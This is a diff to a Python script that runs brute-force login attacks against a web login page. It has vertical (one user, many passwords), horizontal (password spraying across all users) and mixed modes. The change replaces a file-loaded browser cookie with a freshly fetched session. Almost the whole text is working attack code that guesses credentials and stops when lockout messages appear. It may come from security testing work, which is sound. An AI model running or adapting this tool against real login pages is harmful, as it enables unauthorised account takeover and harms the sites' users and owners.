@@ -1,5 +1,4 @@
 import requests
-from bs4 import BeautifulSoup
 import time
 
 # URL for login
@@ -16,16 +15,18 @@ except FileNotFoundError as e:
     print(f"Error: {e}")
     exit(1)
 
-def load_cookie():
-    """Load session cookie from file."""
-    try:
-        with open('browser_cookie.txt', 'r') as file:
-            cookie_line = file.read().strip()
-            key, value = cookie_line.split('=', 1)
-            return {key: value}
-    except Exception as e:
-        print(f"Error loading cookie: {e}")
-        exit(1)
+
+def get_new_session():
+    """Retrieve a new session by making a GET request to the login page."""
+    with requests.Session() as session:
+        response = session.get(LOGIN_URL)
+        if 'Set-Cookie' in response.headers:
+            print("[INFO] New session cookie obtained.")
+            return session  # The session now contains the PHPSESSID cookie
+        else:
+            print("[ERROR] Failed to obtain session cookie.")
+            exit(1)
+
 
 def attempt_login(session, username, password):
     """Attempt to login with given username and password."""
@@ -64,91 +65,93 @@ def attempt_login(session, username, password):
     print(f"[INFO] Response: {response.status_code}, {response.text}")
     return False, response
 
+
 # Define color codes
 GREEN = "\033[32m"
 RED = "\033[31m"
 RESET = "\033[0m"
 
+
 def vertical_brute_force(single_username, sleep_time):
     """Perform vertical brute-force attack for a single user."""
     failed_attempts = 0
 
-    with requests.Session() as session:
-        session.cookies.update(load_cookie())  # Load cookie into session
+    session = get_new_session()  # Obtain a new session
 
-        for password in passwords:
-            success, response = attempt_login(session, single_username, password)
+    for password in passwords:
+        success, response = attempt_login(session, single_username, password)
 
-            if success:
-                print(f"{GREEN}[SUCCESS]{RESET} Username: {single_username}, Password: {password}")
-                return
-            elif "Invalid credentials" in response.text:
-                print(f"[FAIL] Password: {password}")
-                failed_attempts += 1
-            else:
-                print(f"[INFO] Password: {password}, Response: {response.status_code}")
+        if success:
+            print(f"{GREEN}[SUCCESS]{RESET} Username: {single_username}, Password: {password}")
+            return
+        elif "Invalid credentials" in response.text:
+            print(f"[FAIL] Password: {password}")
+            failed_attempts += 1
+        else:
+            print(f"[INFO] Password: {password}, Response: {response.status_code}")
 
-            # Stop if brute-force protection activates
-            if response.status_code == 403 or "too many attempts" in response.text.lower():
-                print(f"{RED}[BLOCKED]{RESET} Brute-force prevention detected after {failed_attempts} attempts.")
-                break
+        # Stop if brute-force protection activates
+        if response.status_code == 403 or "too many attempts" in response.text.lower():
+            print(f"{RED}[BLOCKED]{RESET} Brute-force prevention detected after {failed_attempts} attempts.")
+            break
 
-            time.sleep(sleep_time)
+        time.sleep(sleep_time)
+
 
 def horizontal_attack(sleep_time):
     """Perform horizontal brute-force attack (one password across all users)."""
     failed_attempts = 0
 
-    with requests.Session() as session:
-        session.cookies.update(load_cookie())
+    session = get_new_session()  # Obtain a new session
 
-        for password in passwords:
-            print(f"Attempting Password: {password} across all users")
+    for password in passwords:
+        print(f"Attempting Password: {password} across all users")
 
-            for username in usernames:
-                success, response = attempt_login(session, username, password)
+        for username in usernames:
+            success, response = attempt_login(session, username, password)
 
-                if success:
-                    print(f"{GREEN}[SUCCESS]{RESET} Username: {username}, Password: {password}")
-                    return
-                elif "Invalid credentials" in response.text:
-                    print(f"[FAIL] Username: {username}, Password: {password}")
-                    failed_attempts += 1
-                else:
-                    print(f"[INFO] Response: {response.status_code}")
+            if success:
+                print(f"{GREEN}[SUCCESS]{RESET} Username: {username}, Password: {password}")
+                return
+            elif "Invalid credentials" in response.text:
+                print(f"[FAIL] Username: {username}, Password: {password}")
+                failed_attempts += 1
+            else:
+                print(f"[INFO] Response: {response.status_code}")
 
-                if response.status_code == 403 or "too many attempts" in response.text.lower():
-                    print(f"{RED}[BLOCKED]{RESET} Brute-force prevention detected after {failed_attempts} attempts.")
-                    return
+            if response.status_code == 403 or "too many attempts" in response.text.lower():
+                print(f"{RED}[BLOCKED]{RESET} Brute-force prevention detected after {failed_attempts} attempts.")
+                return
 
-                time.sleep(sleep_time)
+            time.sleep(sleep_time)
+
 
 def mixed_attack(sleep_time):
     """Perform mixed brute-force attack."""
-    with requests.Session() as session:
-        session.cookies.update(load_cookie())
+    session = get_new_session()  # Obtain a new session
 
-        for username in usernames:
-            print(f"Testing passwords for Username: {username}")
-            failed_attempts = 0
+    for username in usernames:
+        print(f"Testing passwords for Username: {username}")
+        failed_attempts = 0
 
-            for password in passwords:
-                success, response = attempt_login(session, username, password)
+        for password in passwords:
+            success, response = attempt_login(session, username, password)
 
-                if success:
-                    print(f"{GREEN}[SUCCESS]{RESET} Username: {username}, Password: {password}")
-                    return
-                elif "Invalid credentials" in response.text:
-                    print(f"[FAIL] Username: {username}, Password: {password}")
-                    failed_attempts += 1
-                else:
-                    print(f"[INFO] Response: {response.status_code}")
+            if success:
+                print(f"{GREEN}[SUCCESS]{RESET} Username: {username}, Password: {password}")
+                return
+            elif "Invalid credentials" in response.text:
+                print(f"[FAIL] Username: {username}, Password: {password}")
+                failed_attempts += 1
+            else:
+                print(f"[INFO] Response: {response.status_code}")
 
-                if response.status_code == 403 or "too many attempts" in response.text.lower():
-                    print(f"{RED}[BLOCKED]{RESET} Brute-force prevention triggered after {failed_attempts} attempts.")
-                    break
+            if response.status_code == 403 or "too many attempts" in response.text.lower():
+                print(f"{RED}[BLOCKED]{RESET} Brute-force prevention triggered after {failed_attempts} attempts.")
+                break
 
-                time.sleep(sleep_time)
+            time.sleep(sleep_time)
+
 
 # Choose attack type
 try:
